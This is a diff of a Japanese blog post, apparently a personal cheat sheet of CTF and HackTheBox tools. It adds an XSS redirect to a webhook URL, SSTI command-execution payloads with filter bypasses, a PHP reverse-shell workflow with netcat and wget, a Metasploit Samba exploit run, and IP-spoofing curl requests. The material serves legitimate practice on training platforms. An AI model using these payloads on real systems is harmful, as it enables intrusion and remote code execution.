@@ -1,10 +1,11 @@
 +++
 author = "Hugo Authors"
-title = "CTF ツール まとめ"
-date = "2025-01-15"
+title = "CTF&HTB Tools まとめ"
+date = "2025-11-11"
 description = ""
 tags = [
     "CTF",
+    "HTB"
 ]
 categories = [
     "Security",
@@ -13,7 +14,7 @@ categories = [
 image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png"
 +++
 
-CTFで利用できるツールをまとめる．
+CTFやHTBで利用できるツールを自分用にまとめておく．
 <!--more-->
 ## Forensics
 参考：
@@ -82,17 +83,70 @@ for qr in qr_codes:
 ### FFUF
 WEBファジングツール．
 ```
-ffuf -w wordlists.txt -u http://example.com/FUZZ
+$ ffuf -w wordlists.txt -u http://example.com/FUZZ
+$ ffuf -w subdomains.txt -u http://example.com -H "Host:FUZZ.example.com" -c -fs 178
 ```
 
 **Wordlistsのダウンロード先:**
 - (公式) http://ffuf.me/wordlists
+- (ユーザ名) https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names [names.txt]
 - (シンプルで使いやすい) https://github.com/Bo0oM/fuzz.txt
+- (サブドメイン用) https://wordlists.assetnote.io/ [httparchive_subdomains_2024_05_28.txt]
 
 参考:  
 &emsp;- https://jpn.nec.com/cybersecurity/blog/210604/index.html   
 &emsp;- https://breezebird.net/ffuf/   
 &emsp;- https://qiita.com/kk0128/items/5186cbe6062e0f887e3b  
+
+### .git/
+`.git/`がある場合，[GitHack](https://github.com/lijiejie/GitHack) (https://github.com/lijiejie/GitHack) を用いて，ファイルをダウンロードできる．
+
+### curlコマンド
+```
+// 任意のヘッダー（X-Dev-Access: yes）を付与．
+curl -X POST http://amiable-citadel.picoctf.net:61140/login -H "X-Dev-Access: yes" -d email="ctf-player@picoctf.org"
+
+// -d をJSONで送る場合，Content-Type: application/jsonが必須．
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -H "Content-Type: application/json" -d '{"email":"ctf-player@picoctf.org", "password":"rCRnekkE"}'
+
+// windowsだと以下にしないとダメ．
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -H "Content-Type: application/json" -d "{\"email\":\"ctf-player@picoctf.org\", \"password\":\"rCRnekkE\"}"
+
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -d email="ctf-player@picoctf.org" -d password="rCRnekkE"
+
+// X-Forwarded-ForでIPの偽造が可能？
+curl -X POST http://amiable-citadel.picoctf.net:59204/login -d email="ctf-player@picoctf.org" -d password="rCRnekkE" -H "X-Forwarded-For: 127.0.0.1"
+```
+
+### URLエンコード
+- https://tool.hiofd.com/ja/url-hex-online/
+
+参考：[HTML URL-encoding Reference](https://www.eso.org/~ndelmott/url_encode.html)
+
+### 文字コード
+- [文字 -> Unicode](https://www.tagindex.com/tool/unicode-code.html)
+- [Unicode -> 文字](https://www.tagindex.com/tool/unicode-char.html)
+
+### XSS
+- https://webhook.site/
+
+指定のURLにリダイレクトするスクリプト.
+
+```
+<script>window.location.href="https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f";</script>
+```
+
+### SSTI(Server-Side Template Injection)
+- 判別チートシート https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png
+- ninja (flaskのrender_template_stringは内部でninja使用) 
+    - `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
+    - （「.」が使用できない場合）`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
+    - （「.」「_」が使用できない場合）`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}`
+    - （「.」「_」「[]」が使用できない場合）`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}`
+
+参考：  
+&emsp;- https://onsecurity.io/article/server-side-template-injection-with-jinja2/  
+&emsp;- [CTFのWebセキュリティにおけるSSTIまとめ](https://blog.hamayanhamayan.com/entry/2021/12/15/225142)
 
 ### 探索
 - ソースコードのコメント
@@ -146,6 +200,9 @@ https://stark2420.github.io/starknote/post/uoftctf-2025/#funny-cipher-100
 ### CyberChef
 - https://gchq.github.io/CyberChef/
 
+### ハッシュ値
+- https://crackstation.net/ (Free Password Hash Cracker)
+
 ### 脆弱なRSA暗号
 - (RSA暗号でやってはいけない $n$ のこと) https://www.slideshare.net/slideshow/rsa-n-ssmjp/72368516#1
 - $N$ が既知で，暗号化オラクルあり，平文が既知で暗号文を求める場合
@@ -153,6 +210,23 @@ https://stark2420.github.io/starknote/post/uoftctf-2025/#funny-cipher-100
 
 参考：
 https://zenn.dev/asusn/articles/6bb19c694e94ce#%E6%B1%8E%E7%94%A8%E3%83%84%E3%83%BC%E3%83%AB
+
+```py
+!pip install pycryptodome
+from Crypto.Util.number import long_to_bytes
+
+n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
+c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079
+
+q = 33091
+p = 10952625052656831515204538182703136388328319215692561827776703217129125920630092954719731657697359076607720006975422546048557875675403691541340687683615299
+e = 65537
+phi = (p - 1) * (q - 1)
+d = pow(e, -1, phi)
+m = pow(c, d, n)
+flag = long_to_bytes(m) # or m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')
+print(flag.decode())
+```
 
 
 ## Misc
@@ -382,3 +456,182 @@ Corect! flag{good_job!}
 </details>
 
 
+## HackTheBox(HTB)
+### VPN
+HTBの右上の方の`CONNECT TO HTB`から，`DOWNLOAD VPN`を押して`***.ovpn`をダウンロード．  
+```
+$ sudo openvpn ***.ovpn 
+…
+Initialization Sequence Completed
+…
+```
+前後に色々ログが出るが，Initialization Sequence Completed が出れば成功．
+
+### nmap
+```
+$ nmap -Pn -T4 -sV -sC -A [IPアドレス]
+```
+- Pn: 事前のping送信をしない
+- T4: スキャン速度の指定．0~5で数字が高いほど早いがエラーが出やすい
+- sV: 動作しているサービスのバージョンを確認
+- sC: デフォルトスクリプトスキャン
+- A: 詳細スキャン
+- v: スキャン中の進捗や詳細を表示．-vv にするとさらに詳細に．
+
+### /etc/hosts
+`/etc/hosts` は名前解決用のローカルファイル．  
+ローカルのIPアドレスの名前解決を利用する場合，手動で追加する必要がある．
+```
+$ sudo vi /etc/hosts
+10.10.11.68     planning.htb
+```
+
+### リバースシェル
+
+以下から`php-reverse-shell.php`をダウンロードする（以下`shell.php`），
+
+php-reverse-shell:  
+https://github.com/pentestmonkey/php-reverse-shell
+
+IPアドレス（自分のIPアドレス）とポートを設定する．
+```
+49  $ip = '10.10.x.x';  // CHANGE THIS
+50  $port = 4444; // CHANGE THIS
+```
+
+netcatでリッスン状態にしておく．
+```
+$ nc -lvvp 4444
+```
+
+#### ①wgetでダウンロードする場合
+`shell.php`のあるディレクトリで，以下を実行し簡易サーバを立てる．  
+```
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+ダウンロードしたい場所で以下を実行するとダウンロードできる．
+```
+$ wget [自分のIPアドレス]:8000/shell.php
+or
+$ bash -c "wget [自分のIPアドレス]:8000/shell.php"
+```
+
+以下で shell.php を実行させる．
+```
+$ php shell.php
+or
+$ bash -c "php shell.php"
+```
+
+#### ②アップロード機能を利用する場合
+`shell.php`をアップロード機能を用いてアップロードする．  
+phpが許可されていない場合は，使用可能な拡張子に変更．  
+格納されたディレクトリに，ブラウザまたはcurlコマンドでアクセス．
+
+
+①または②でシェルが取得出来たら，以下を実行してシェルを安定化させる．
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash");'
+```
+
+参考：  
+https://qiita.com/Brutus/items/1f9b1db93482ffbca6c2
+
+
+### searchsploit
+脆弱性の検索．
+```
+$ searchsploit vsFTPd 2.3.4 
+----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                  | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)     | unix/remote/17491.rb
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+$ searchsploit samba 3.0.20
+----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass     | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command  | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                      | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)              | linux_x86/dos/36741.py
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+### Metasploit
+Metasploit Frameworkは攻撃コードの作成，実行を行うためのフレームワークソフトウエア．
+```
+$ msfconsole
+msf6 > search Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(multi/samba/usermap_script) > options
+
+odule options (exploit/multi/samba/usermap_script):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:po
+                                       rt][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/
+                                       docs/using-metasploit/basics/using-metasploit.html
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.19.46.189    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf6 exploit(multi/samba/usermap_script) > set rhosts [ターゲットのIPアドレス]
+msf6 exploit(multi/samba/usermap_script) > set lhost [攻撃者側のIPアドレス]
+msf6 exploit(multi/samba/usermap_script) > run
+```
+
+### linuxコマンド
+```
+$ whoami    // 現在ログイン中のユーザー名を表示
+root
+
+$ id    // uid：ユーザーID，gid：Group ID，groups：所属しているすべてのグループ
+uid=0(root) gid=0(root) groups=0(root)
+
+$ su [ユーザー名]   // ユーザーを一時的に切り替える
+
+$ sudo -l    // sudo権限の一覧
+
+$ find / -name user.txt
+$ find / -name root.txt
+
+$ grep -r "pass" ./folder
+$ grep -r "database" ./folder | grep "root"
+
+$ tar -xjf xxx.tar.bz2
+```
